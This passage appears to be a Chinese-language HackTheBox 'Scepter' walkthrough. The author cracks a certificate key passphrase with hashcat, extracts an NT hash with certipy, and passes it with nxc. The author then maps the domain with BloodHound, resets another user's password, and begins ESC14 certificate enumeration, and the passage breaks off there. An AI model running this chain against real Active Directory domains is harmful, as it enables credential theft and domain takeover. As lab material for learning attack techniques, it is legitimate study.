+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ dir
+</span></span><span style="display:flex;"><span>baker.crt  baker.key  clark.pfx  hostname  krb5.conf  lewis.pfx  scott.pfx  start.sh  test
+</span></span></code></pre></div><p>只有baker提供了key文件，所以先爆破他</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat baker.hash 
+</span></span><span style="display:flex;"><span>$PEM$1$4$d7b39fa5d2d1d06153a95e1d2a80de86$2048$472edaace794795742a020c4e126cdd4$1232$1e3ebe95baabe7041737c3aac5ee7b879bee03c8a121c22d7bf8290d1367233bcb0ef990de04ab244e75774138561cf1712607e379b75fae0643c9a41123aea0a879261c17e7ebd61ef6ca335f24a267e95f830785ed09c1b968f0385cde3d814ae851a18a46f6627049d013605c319589d6179e3df5b0c71a43e738f911d3c0bf151c96d50849ab230634b9c9f48c655b2498f859bfd1140ecaee214b4bbcece2e88255bd3888437eeeabcf441d0d622cfb5750c6bc046ba38174bfaadfc3522ba1f6701a290984edc86c3f3a4ce5e7e2eb9f8d756b61dda53f098d78a74cd64cb67f61c30e9432aa8c518cd71bacdf050fef4a8bad216d3f5a48396f80552bfc16fc4161eaf701956564d02757cfc91272c5b1eca178e32a8a4cdfda5867ef631d83596d7b706cd4b0ebc0996d4e5e0bb6601615023b3abdb5d8cc9caacd328896c48a9a73fec336a8c6002c4ff42d1001e9a4c0c85b48c40e9603711bd18b9fff123a5d6f3dd7113bc45c58f5384a56570593c5948cb62123091254fdbb6246c5e8075a759af1c40354723be5d7f77c97e5645b15407ee6df6df17ad50ac52dd497c535d55a982e018730089c582eb7be0d88843bbdb7b73a536cb1ed195ad7f0a1fe26cdbe14d5eedd09f7c3d08a0a5cbc5986ccdd09abdef1e35a1d88ba37bc0ee4072d369e47850161b6881349ef7d3479c4e35cd11d371e8ec16c5104bf9a9cee6d45e3686913b79b8f4495eec39fa3731a593af5ca6faa8374951209afce7787c6826406b5a281aff5c8722420fcaf7a0815076b2a7a59c05c030b5365e51024cfd5fea85e1ed8a9b098ee2737818b7e488ada5a7db95caca3129ad20a13def66f97c35f435d9c3092acd65e4d73580b804ddbeb7887540fd617965368dfccd2c0703a03f9a52ba56fc90841b033339ee8c4c273f87734260e70fbdc7372f6d305ceb583a3a7a8330dda76265896fa7e905319bb7c9a3f014b46192927ce267755b31c7ea0b8bdb3f2f3c7767c7b7d4169883a68e9329c1939ba2d03cacca60e35171b1742af66a99cb4f2da6917a4f40ddc1803cb2889ce126cca5402eb80cfd5894702ad1f0946a0936d06b2dfad52ac5273bf1466690ce63221108132533223abb62cf2d5911209c7eb5a8d0864ce17d399dc7a09052679a254db02fdd9f6358ea4de45c9b64fbd13547299936b2971a1a9955711816745033e762473427d58c27c9e9d45b54fc5b482daf1cdfd825af0b71003444680ac68875b110bfdc71c5433c2d27fc67a7f764e18b27b6b50e82bf3f99c8d8a9087b5aa4731c5606fd5136229cb75d3ea238d8b6de08220163fd2957b471170f4b08cde05cd01fe7d7deb7f5c7c61c408f54ae272ac48d8833743d74391984ccf8ca34ad3b65c6a4ea39a1d022393c926fdb5f96f2993a0817299135128ee51e95987cab7b6da42550415bd91b2503426306d27c7dd26a7475b5fbcde8f10378009b58a8d0c1e9d1dac4c9b01bb2f55a708ca1f6c60f194af9b76c82bdc16a95edd27ebe25703a892ee2f09c184e50e9e546174d3f3b7d419e8cd057842b09383649190c558f197924c86668b6ef14d5b46030197bc5a75fb2ec629ed7f9a8db73784e488214d493ae7eb19643156f92815d5dc4411bd2f5e54c2cae97f3af6080e49de444c071b994278c9f74c964f02855148f7a73086d96cab68d267e388e8dec149ce8521c9429461f9f694cb67c0ebf0fff0
+</span></span></code></pre></div><p>hashcat的24420模式与他类似，需要将$PEM$1改为$PEM$2进行爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>hashcat baker.hash rockyou.txt 
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+</span></span><span style="display:flex;"><span>The following mode was auto-detected as the only one matching your input hash:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24420</span> | PKCS#8 Private Keys <span style="color:#f92672">(</span>PBKDF2-HMAC-SHA256 + 3DES/AES<span style="color:#f92672">)</span> | Private Key
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>$PEM$2$4$d7b39fa5d2d1d06153a95e1d2a80de86$2048$472edaace794795742a020c4e126cdd4$1232$1e3ebe95baabe7041737c3aac5ee7b879bee03c8a121c22d7bf8290d1367233bcb0ef990de04ab244e75774138561cf1712607e379b75fae0643c9a41123aea0a879261c17e7ebd61ef6ca335f24a267e95f830785ed09c1b968f0385cde3d814ae851a18a46f6627049d013605c319589d6179e3df5b0c71a43e738f911d3c0bf151c96d50849ab230634b9c9f48c655b2498f859bfd1140ecaee214b4bbcece2e88255bd3888437eeeabcf441d0d622cfb5750c6bc046ba38174bfaadfc3522ba1f6701a290984edc86c3f3a4ce5e7e2eb9f8d756b61dda53f098d78a74cd64cb67f61c30e9432aa8c518cd71bacdf050fef4a8bad216d3f5a48396f80552bfc16fc4161eaf701956564d02757cfc91272c5b1eca178e32a8a4cdfda5867ef631d83596d7b706cd4b0ebc0996d4e5e0bb6601615023b3abdb5d8cc9caacd328896c48a9a73fec336a8c6002c4ff42d1001e9a4c0c85b48c40e9603711bd18b9fff123a5d6f3dd7113bc45c58f5384a56570593c5948cb62123091254fdbb6246c5e8075a759af1c40354723be5d7f77c97e5645b15407ee6df6df17ad50ac52dd497c535d55a982e018730089c582eb7be0d88843bbdb7b73a536cb1ed195ad7f0a1fe26cdbe14d5eedd09f7c3d08a0a5cbc5986ccdd09abdef1e35a1d88ba37bc0ee4072d369e47850161b6881349ef7d3479c4e35cd11d371e8ec16c5104bf9a9cee6d45e3686913b79b8f4495eec39fa3731a593af5ca6faa8374951209afce7787c6826406b5a281aff5c8722420fcaf7a0815076b2a7a59c05c030b5365e51024cfd5fea85e1ed8a9b098ee2737818b7e488ada5a7db95caca3129ad20a13def66f97c35f435d9c3092acd65e4d73580b804ddbeb7887540fd617965368dfccd2c0703a03f9a52ba56fc90841b033339ee8c4c273f87734260e70fbdc7372f6d305ceb583a3a7a8330dda76265896fa7e905319bb7c9a3f014b46192927ce267755b31c7ea0b8bdb3f2f3c7767c7b7d4169883a68e9329c1939ba2d03cacca60e35171b1742af66a99cb4f2da6917a4f40ddc1803cb2889ce126cca5402eb80cfd5894702ad1f0946a0936d06b2dfad52ac5273bf1466690ce63221108132533223abb62cf2d5911209c7eb5a8d0864ce17d399dc7a09052679a254db02fdd9f6358ea4de45c9b64fbd13547299936b2971a1a9955711816745033e762473427d58c27c9e9d45b54fc5b482daf1cdfd825af0b71003444680ac68875b110bfdc71c5433c2d27fc67a7f764e18b27b6b50e82bf3f99c8d8a9087b5aa4731c5606fd5136229cb75d3ea238d8b6de08220163fd2957b471170f4b08cde05cd01fe7d7deb7f5c7c61c408f54ae272ac48d8833743d74391984ccf8ca34ad3b65c6a4ea39a1d022393c926fdb5f96f2993a0817299135128ee51e95987cab7b6da42550415bd91b2503426306d27c7dd26a7475b5fbcde8f10378009b58a8d0c1e9d1dac4c9b01bb2f55a708ca1f6c60f194af9b76c82bdc16a95edd27ebe25703a892ee2f09c184e50e9e546174d3f3b7d419e8cd057842b09383649190c558f197924c86668b6ef14d5b46030197bc5a75fb2ec629ed7f9a8db73784e488214d493ae7eb19643156f92815d5dc4411bd2f5e54c2cae97f3af6080e49de444c071b994278c9f74c964f02855148f7a73086d96cab68d267e388e8dec149ce8521c9429461f9f694cb67c0ebf0fff0:newpassword
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span></code></pre></div><p>得到密码newpassword</p>
+<p>用这个密码为baker创建证书，可以正常请求hash（其他证书我试过了，并不可以请求）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ openssl pkcs12 -export -inkey baker.key -in baker.crt -out baker.pfx
+</span></span><span style="display:flex;"><span>Enter pass phrase <span style="color:#66d9ef">for</span> baker.key:
+</span></span><span style="display:flex;"><span>Enter Export Password:
+</span></span><span style="display:flex;"><span>Verifying - Enter Export Password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ dir
+</span></span><span style="display:flex;"><span>baker.crt  baker.hash  baker.key  baker.pfx  clark.pfx	hostname  krb5.conf  lewis.pfx	scott.pfx  start.sh  test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy auth -pfx baker.pfx -dc-ip $ip
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN UPN: <span style="color:#e6db74">&#39;d.baker@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     Security Extension SID: <span style="color:#e6db74">&#39;S-1-5-21-74879546-916818434-740295365-1106&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;d.baker@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;d.baker.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;d.baker.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;d.baker&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;d.baker@scepter.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
+</span></span></code></pre></div><p>得到新用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user<span style="color:#f92672">=</span>d.baker&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo hash<span style="color:#f92672">=</span>18b5fb0d99e7a475316213c15b6f22ce&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user -H $hash
+</span></span><span style="display:flex;"><span>WINRM       10.129.103.0    <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:scepter.htb<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>WINRM       10.129.103.0    <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> scepter.htb<span style="color:#ae81ff">\d</span>.baker:18b5fb0d99e7a475316213c15b6f22ce
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user -H $hash
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:scepter.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> scepter.htb<span style="color:#ae81ff">\d</span>.baker:18b5fb0d99e7a475316213c15b6f22ce 
+</span></span></code></pre></div><p>没有winrm权限，抓猎犬</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodhound-python -d $domain -c ALL -u $user --hashes :$hash -ns $ip --zip
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: scepter.htb
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of <span style="color:#ae81ff">4</span> bytes
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.scepter.htb
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.scepter.htb
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">11</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">57</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">3</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: dc01.scepter.htb
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 19S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20250901151445_bloodhound.zip
+</span></span></code></pre></div><p><img src="/scepter/image.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>出站能改密码，但这个用户也不在远程管理组，改之前顺着用户往下看</p>
+<p><img src="/scepter/image-1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>此用户能完全掌控员工出入证这个ou，而这个ou里，或者说这个证书允许注册的用户是</p>
+<p><img src="/scepter/image-2.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>这个用户的出站没有什么意义</p>
+<p><img src="/scepter/image-3.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="esc14">ESC14
+</h2><p>改密码后用A.CARTER查询易受攻击的证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user -H $hash -M change-password -o USER<span style="color:#f92672">=</span>A.CARTER  NEWPASS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wackyMAKER1!&#39;</span>
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:scepter.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> scepter.htb<span style="color:#ae81ff">\d</span>.baker:18b5fb0d99e7a475316213c15b6f22ce 
+</span></span><span style="display:flex;"><span>CHANGE-P... 10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully changed password <span style="color:#66d9ef">for</span> A.CARTER
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user1<span style="color:#f92672">=</span>A.CARTER&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wackyMAKER1!&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -u $user1 -p $pass1 -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">35</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">20</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;scepter-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc01.scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : scepter-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc01.scepter.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>scepter-DC01-CA, DC<span style="color:#f92672">=</span>scepter, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : SCEPTER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          SCEPTER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : SCEPTER.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -u $user1 -p $pass1 -target $FQDN -dc-ip $ip -text -stdout -vulnera^Ce
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -vulnerable -u $user -hashes :$hash -dc-ip $ip -stdout
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">35</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
